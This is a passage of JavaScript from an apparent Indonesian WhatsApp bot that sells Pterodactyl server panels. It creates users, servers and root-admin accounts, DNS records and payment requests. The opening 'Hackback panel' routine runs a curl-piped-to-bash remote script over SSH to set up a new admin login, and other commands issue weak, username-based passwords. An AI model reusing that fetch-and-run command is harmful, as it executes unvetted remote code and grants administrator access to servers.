const command = `bash <(curl -s https://raw.githubusercontent.com/yilzizoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await yilzi.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("yilzizodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "subdomain": case "subdo": {
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break

//================================================================================

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//================================================================================

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await yilzi.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await yilzi.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addprem": case "addpremium": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah premium ✅`)
}
break

//================================================================================

case "listpremium": case "listprem": {
if (premium.length < 1) return m.reply("Tidak ada user premium")
let teks = `\n *#- List all user premium*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
yilzi.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delpremium": case "delprem": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus premium owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan user premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus premium ✅`)
}
break
case "cekpanel": {
if (!text) return m.reply('*-# Masukkan Panel* ID\nContoh: .cekpanel 1234');
const panelId = text;

try {
const response = await fetch(`${domain}/api/application/servers`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${apikey}`
}
});

if (!response.ok) {
throw new Error(`Failed to fetch servers: ${response.status}`);
}
const resData = await response.json();

const server = resData.data.find(s => s.attributes.id === parseInt(panelId));

if (!server) {
return m.reply(`*🔴 -# Server Panel Id Tidak Valid ${panelId}*`);
}
const serverAttributes = server.attributes;
const usageResponse = await fetch(`${domain}/api/client/servers/${serverAttributes.uuid.split('-')[0]}/resources`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${capikey}`
}
});
if (!usageResponse.ok) {
throw new Error(`Failed to fetch resource usage: ${usageResponse.status}`);
}
const usageData = await usageResponse.json();
const formatSize = (size) => {
if (!size || size === 0) return "Unlimited";
if (size >= 1024) {
return `${Math.floor(size/1024)}GB`;
}
return `${size}MB`;
};
const formatCPU = (cpu) => {
return !cpu || cpu === 0 ? "Unlimited" : `${cpu}%`;
};
const formatNetworkSpeed = (bytes) => {
if (!bytes) return "0 KB/s";
const kb = bytes / 1024;
return `${kb.toFixed(2)} KB/s`;
};
const getStatus = (state) => {
const statusMap = {
'running': '🟢 Running',
'starting': '🟡 Starting',
'stopping': '🟡 Stopping',
'stopped': '🔴 Stopped',
'offline': '⚫ Offline'
};
return statusMap[state.toLowerCase()] || `❓ ${state}`;
};
let message = `📊 *-# Detail Server Panel Anda*
* *-# Nama:* ${serverAttributes.name}
* *-# Panel ID:* ${serverAttributes.id}\n
${getStatus(usageData.attributes.current_state)}

📊 *[ - ] Detail Resource Usage: [ - ]*
* *-# CPU:* ${formatCPU(serverAttributes.limits.cpu)}
* *-# RAM:* ${formatSize(serverAttributes.limits.memory)}
* *-# Disk:* ${formatSize(serverAttributes.limits.disk)}
* *-# Upload:* ${formatNetworkSpeed(usageData.attributes.resources.network_rx_bytes)}
* *-# Download:* ${formatNetworkSpeed(usageData.attributes.resources.network_tx_bytes)}

*[ - ] Jika Mau Cek Panel Anda Lagi silahkan : .cekpanel [ - ]*`;

await yilzi.sendMessage(m.chat, {image: {url: "https://i.postimg.cc/wvH7FBgQ/Warungerik.jpg" }, caption: message }, {quoted: m})

} catch (error) {
console.error('Error detail:', error);
return m.reply(`❌ Terjadi kesalahan: ${error.message}`);
}}
break
case "belipanel": {
try {
// Check if it's a group chat
if (m.isGroup) {
return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat");
}

// Check if there's an ongoing purchase process
const senderFile = `./src/gateway/${m.sender.split("@")[0]}.json`;
if (fs.existsSync(senderFile)) {
return m.reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`);
}

// Available RAM server options
const ramOptions = `
*RAM SERVER YANG TERSEDIA*
*───────────────────────────────*
🟢 1GB — Rp 1.000
🟢 2GB — Rp 2.000
🟢 3GB — Rp 3.000
🟢 4GB — Rp 4.000
🟢 5GB — Rp 5.000
🟢 6GB — Rp 6.000
🟢 7GB — Rp 7.000
🟢 8GB — Rp 8.000
🟢 10GB — Rp 10.000
🟠 UNLIMITED — Rp 11.000 🎉
*( Yilzi Shop ⚡ )*
*───────────────────────────────*
💡 Contoh Penggunaan:
*.buypanel nama 1gb*
`;

// Parse input
const [inputUsername, ramSize] = text.split(" ");

// Validate input
if (!inputUsername) {
return m.reply("Silakan berikan username untuk panel");
}
if (!ramSize) {
return m.reply(ramOptions);
}

// Define server configuration based on RAM size
const serverConfigs = {
"1gb": { ram: "1125", disk: "1125", cpu: "30", harga: 1000 },
"2gb": { ram: "2125", disk: "2125", cpu: "60", harga: 2000 },
"3gb": { ram: "3125", disk: "3125", cpu: "80", harga: 3000 },
"4gb": { ram: "4125", disk: "4125", cpu: "90", harga: 4000 },
"5gb": { ram: "5125", disk: "5125", cpu: "100", harga: 5000 },
"6gb": { ram: "6125", disk: "6125", cpu: "120", harga: 6000 },
"7gb": { ram: "7125", disk: "7125", cpu: "130", harga: 7000 },
"8gb": { ram: "8125", disk: "8125", cpu: "150", harga: 8000 },
"10gb": { ram: "10125", disk: "10125", cpu: "200", harga: 10000 },
"unli": { ram: "0", disk: "0", cpu: "0", harga: 11000 }
};

// Get server configuration
const cmd = ramSize.toLowerCase();
const Obj = serverConfigs[cmd];

if (!Obj) {
return m.reply("RAM yang dipilih tidak valid. Silakan pilih dari daftar tersedia.");
}

// Check balance in saldo.json
const saldoFile = `./src/saldo/${m.sender.split('@')[0]}.json`;
let saldo = 0;
if (fs.existsSync(saldoFile)) {
const saldoData = JSON.parse(fs.readFileSync(saldoFile));
saldo = saldoData.saldo || 0;
}

// Check if the user has enough balance
if (saldo >= Obj.harga) {
// Deduct the balance and proceed with the purchase
saldo -= Obj.harga;
fs.writeFileSync(saldoFile, JSON.stringify({ saldo: saldo }, null, 3));

// Proceed with panel creation (no need for Saweria)
await createPanel(m, Obj, inputUsername);
return m.reply(`Pembelian panel menggunakan saldo berhasil!`);

} else {
// If balance is insufficient, use Saweria payment method
const Pay = new Saweria(db_saweria);
const res = await Pay.createPayment(Obj.harga, `BUY`);

if (!res.status) {
return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`);
}

// Prepare payment information text
const paymentText = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

**〆* ID Pembayaran: ${res.data.id}
**〆* Total Transfer: ${res.data.amount_raw}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batalbuy*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`;

// Save purchase information
const objectBuy = {
number: m.sender,
id: res.data.id
};
fs.writeFileSync(senderFile, JSON.stringify(objectBuy, null, 3));

// Send QR code
await yilzi.sendMessage(from, { 
image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), 
caption: paymentText 
}, { quoted: m });

// Payment status check loop
let status = false;
while (!status) {
await sleep(500);
const ress = await Pay.checkPayment(res.data.id);
status = ress.status;

if (ress.status) {
// Create Pterodactyl user account
await createPanel(m, Obj, inputUsername);
break;
}
}
}

} catch (error) {
console.error("Error in buypanel process:", error);
m.reply("Terjadi kesalahan dalam proses pembelian panel. Silakan coba lagi.");
}
}

async function createPanel(m, Obj, inputUsername) {
// Create panel as you did in the original code
const username = inputUsername.toLowerCase();
const email = `${username}@gmail.com`;
const name = capital(username) + " Server";
const password = username + crypto.randomBytes(2).toString('hex');

const userResponse = await fetch(domain + "/api/application/users", {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
body: JSON.stringify({
email: email,
username: username,
first_name: name,
last_name: "Server",
language: "en",
password: password
})
});

const userData = await userResponse.json();
if (userData.errors) {
throw new Error(JSON.stringify(userData.errors[0], null, 2));
}

const user = userData.attributes;
const desc = tanggal(Date.now());
const userId = user.id;

// Get egg information
const eggResponse = await fetch(`${domain}/api/application/nests/${nestid}/eggs/${egg}`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});

const eggData = await eggResponse.json();
const startupCmd = eggData.attributes.startup;

// Create server
const serverResponse = await fetch(domain + "/api/application/servers", {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
body: JSON.stringify({
name: name,
description: desc,
user: userId,
egg: parseInt(egg),
docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
startup: startupCmd,
environment: {
INST: "npm",
USER_UPLOAD: "0",
AUTO_UPDATE: "0",
CMD_RUN: "npm start"
},
limits: {
memory: Obj.ram,
swap: 0,
disk: Obj.disk,
io: 500,
cpu: Obj.cpu
},
feature_limits: {
databases: 5,
backups: 5,
allocations: 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
});

const serverResult = await serverResponse.json();
if (serverResult.errors) {
throw new Error(JSON.stringify(serverResult.errors[0], null, 2));
}

const server = serverResult.attributes;

// Prepare and send panel account
const panelText = `
*Berhasil Membuat Akun Panel ✅*

*ID Server :* ${server.id}
*Nama :* ${name}
*Username :* ${user.username}
*Password :* ${password}
*Login :* ${global.domain}
*Ram :* ${Obj.ram === "0" ? "Unlimited" : Obj.ram.length > 4 ? Obj.ram.slice(0, 2) + "GB" : Obj.ram.charAt(0) + "GB"}
*Cpu :* ${Obj.cpu === "0" ? "Unlimited" : Obj.cpu + "%"}
*Disk :* ${Obj.disk === "0" ? "Unlimited" : Obj.disk.length > 4 ? Obj.disk.slice(0, 2) + "GB" : Obj.disk.charAt(0) + "GB"}
*Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`;
await yilzi.sendMessage(m.chat, { text: panelText }, { quoted: null });
}
break

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await yilzi.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await yilzi.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
await m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await yilzi.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await yilzi.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await yilzi.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
